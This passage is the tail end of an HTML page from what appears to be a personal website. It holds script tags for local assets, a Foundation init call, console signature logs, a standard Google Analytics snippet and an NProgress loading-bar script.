    <script src="http://localhost:4000/assets/js/scripts.min.js"></script>
    <script src="http://localhost:4000/assets/js/vendor/nprogress.js"></script>

    <script>
      $(document).foundation();
    </script>
    <script type='text/javascript'>console.log("@abdilahrf");</script>
    <script type='text/javascript'>console.log("https://abdilahrf.me");</script>


<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-96190645-1', 'auto');
  ga('require', 'displayfeatures');
  ga('send', 'pageview');

</script>

<script>NProgress.start();var interval=setInterval(function(){NProgress.inc()},1000);jQuery(window).load(function(){clearInterval(interval);NProgress.done()});jQuery(window).unload(function(){NProgress.start()});</script>
 
</body>
</html>